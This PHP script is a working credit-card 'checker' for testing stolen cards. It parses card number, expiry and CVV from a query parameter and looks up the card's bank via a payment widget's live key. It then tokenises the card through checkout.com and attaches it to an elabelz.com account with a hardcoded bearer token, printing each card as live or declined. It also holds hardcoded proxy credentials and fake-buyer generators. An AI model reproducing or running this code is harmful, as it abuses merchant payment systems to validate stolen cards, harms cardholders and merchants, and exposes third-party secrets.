<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);
$binn = substr($cc,0,6);



if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4"; 
}

// If(strlen($ano) > 2)
// {
//   $ano = substr($ano,2,2);
// }
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
	$nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
	return $nombre;
}
function datosapellido(){
	$apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
	return $apellido;
}


function email($nombre){
	$email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
	return $email;
}
 function ibuuproxy(){
  $proxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($proxySocks)-1);
   $proxySocks = $proxySocks[$myproxy];
 return $proxySocks;
}


///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
$email = email($nombre);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$username = 'lum-customer-hl_7873c611-zone-static_res';
$password = 'p8txkzc6mq9h';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);


// echo $binn;



$auth = substr(str_shuffle(str_repeat("ABCDEFGHIJabcdefghijklmopqrstuvxyz", 12)), 0, 12);


#req1==============================================================================






$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://secure.gosell.io/tappaymentwidget/public/api/get_detail_by_bin_v2?bin='.$binn.'&key=pk_live_Q4JFRchbCWalDYnKVIzsTE58');
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_POST, 1);
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
// curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
# Uncomment the upper two lines if you have filled the upper login details
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'referer: https://secure.gosell.io/tappaymentwidget/public//tap_payment_widget_ui?style[base][color]=%23535353&style[base][lineHeight]=18px&style[base][fontFamily]=sans-serif&style[base][fontSmoothing]=antialiased&style[base][fontSize]=16px&style[base][::placeholder][color]=rgba(0%2C%200%2C%200%2C%200.26)&style[base][::placeholder][fontSize]=15px&style[invalid][color]=red&mid=null&key=pk_live_Q4JFRchbCWalDYnKVIzsTE58&currencyCode[0]=KWD&labels[cardNumber]=CARD%20NUMBER&labels[expirationDate]=MM%2FYY&labels[cvv]=CVV&labels[cardHolder]=CARD%20HOLDER%20NAME&TextDirection=ltr&paymentAllowed[0]=VISA&paymentAllowed[1]=MASTERCARD&paymentAllowed[2]=AMEX&paymentAllowed[3]=MADA/',
// 'user-agent: '.$browser.'',
'x-requested-with: XMLHttpRequest'
));
// curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$binn.'&key=pk_live_Q4JFRchbCWalDYnKVIzsTE58');

$update = curl_exec($ch);

 $country = trim(strip_tags(getstr($update,'"country_name":"','"')));
 $bank = trim(strip_tags(getstr($update,'"bank":"','"')));
 $type = trim(strip_tags(getstr($update,'"card_type":"','"')));
 $category = trim(strip_tags(getstr($update,'"card_category":"','"')));
 $brand = trim(strip_tags(getstr($update,' "card_brand":"','"')));




curl_close($ch);
 
// echo $update;







$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api2.checkout.com/v2/tokens/card');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
   // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
   // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json, text/javascript, */*; q=0.01',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: en-US,en;q=0.9',
'AUTHORIZATION: pk_a58d5722-4fd8-485f-ab9b-08cbe7568d21',
'Content-Type: application/json',
'Host: api2.checkout.com',
'Origin: https://js.checkout.com',
'Referer: https://js.checkout.com/frames/?v=1.0.16&publicKey=pk_a58d5722-4fd8-485f-ab9b-08cbe7568d21&theme=standard',
'user-agent: '.$browser.''
));

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"number":"'.$cc.'","expiryMonth":"'.$mes.'","expiryYear":"'.$ano.'","cvv":"'.$cvv.'","requestSource":"JS"}');


$b_pago = curl_exec($ch);

 // echo $b_pago;
$token = trim(strip_tags(getstr($b_pago,'"id":"','"')));
// $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
// $issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
// $debit = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
// $prepaid = trim(strip_tags(getstr($b_pago,'"prepaid":"','"')));
// $cardtype = trim(strip_tags(getstr($b_pago,'"cardType":"','"')));

// $token2 = trim(strip_tags(getstr($b_pago,'"token":"','","creditCard"')));
//$idempotency_key = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 8)), 0, 8);
//$idempotency_key2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 9)), 0, 9);
// echo $token;
// echo $issuecountry;
// echo $issuebank;


// #==========================================================================================================



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://backend.elabelz.com/users/me/card');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
 // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

   curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InZ2YXJuZXIzQGdtYWlsLmNvbSIsImlhdCI6MTU4NzcwOTk2OSwiZXhwIjoxNTg3NzEzNTY5fQ.p2TkLVQsBIlkZN1H5_skgFwClZiX0Jud7Py-B356aMI',
'content-type: application/json',
'country: us',
'currency: 5b9914161998f706d07fed75',
'locale: en',
'origin: https://www.elabelz.com',
'referer: https://www.elabelz.com/us/checkout',
'user-agent: '.$browser.''
));

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"name":"card","default":true,"token":"'.$token.'","provider":"Checkout"}');

$result = curl_exec($ch);


// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, 'https://secure.gosell.io/tappaymentwidget/public/api/get_detail_by_bin_v2?bin='.$binn.'&key=pk_live_Q4JFRchbCWalDYnKVIzsTE58');
// curl_setopt($ch, CURLOPT_HEADER, 0);
// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//  // curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
//  // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// //  curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
// 'accept: */*',
// 'accept-encoding: gzip, deflate, br',
// 'accept-language: en-US,en;q=0.9',
// 'cache-control: no-cache',
// 'pragma: no-cache',
// 'referer: https://secure.gosell.io/tappaymentwidget/public//tap_payment_widget_ui?style[base][color]=%23535353&style[base][lineHeight]=18px&style[base][fontFamily]=sans-serif&style[base][fontSmoothing]=antialiased&style[base][fontSize]=16px&style[base][::placeholder][color]=rgba(0%2C%200%2C%200%2C%200.26)&style[base][::placeholder][fontSize]=15px&style[invalid][color]=red&mid=null&key=pk_live_Q4JFRchbCWalDYnKVIzsTE58&currencyCode[0]=KWD&labels[cardNumber]=CARD%20NUMBER&labels[expirationDate]=MM%2FYY&labels[cvv]=CVV&labels[cardHolder]=CARD%20HOLDER%20NAME&TextDirection=ltr&paymentAllowed[0]=VISA&paymentAllowed[1]=MASTERCARD&paymentAllowed[2]=AMEX&paymentAllowed[3]=MADA',
// 'user-agent: '.$browser.''
// ));
// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$binn.'&key=pk_live_Q4JFRchbCWalDYnKVIzsTE58');

// $c_pago = curl_exec($ch);

// echo $c_pago;

 $message = trim(strip_tags(getstr($result,'"message":"','"')));
// // $code = trim(strip_tags(getstr($result,'"errorClass":"','"')));

// // // // // // // //  // $message3 = trim(strip_tags(getstr($result,'"status": "','"')));

// // // // // // // //  // $message4 = trim(strip_tags(getstr($result,'"errors": {"_all": ["','"]}')));


 if(strpos($result,'"verified":true')){
     echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | '.$type.' | '.$category.'</font></b></font></td></tr>';
   }
	//  elseif(strpos($result, '"statusCode":500')){

 //      echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | Debit : '.$debit.' | Prepaid : '.$prepaid.'</font></b></font></td></tr>';

 // }


 else{

  
     echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | '.$type.' | '.$category.'</font></b></font></td></tr>';



      // echo '<tr><td><font size="3"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="3">'.$lista.'</font></td><td><font size="3">&nbsp;&nbsp;&nbsp;<b>'.$result.' &nbsp;&nbsp;&nbsp;'.$bin.'</b></font></td></tr>';


            }

curl_close($ch);
ob_flush();
   // echo $result;
 // echo $c_pago;
?>

